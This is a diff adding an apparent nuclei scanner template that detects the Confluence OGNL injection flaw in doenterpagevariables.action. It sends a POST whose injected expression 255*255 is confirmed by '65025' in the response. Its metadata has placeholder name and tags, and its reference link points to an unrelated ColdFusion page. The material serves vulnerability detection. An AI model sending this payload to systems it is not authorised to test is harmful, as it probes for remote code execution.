@@ -1,0 +1,28 @@
+id: Atlassian-Confluence-doenterpagevariables-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: Atlassian Confluence是企业广泛使用的wiki系统，其部分版本中存在OGNL表达式注入漏洞。攻击者可以通过这个漏洞，无需任何用户的情况下在目标Confluence中执行任意代码。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/A2-7AdobeColdFusion-RCE?id=a2-7adobecoldfusion-rce
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /pages/doenterpagevariables.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 47
+
+        queryString=%5cu0027%2b%7b255*255%7d%2b%5cu0027
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '65025'
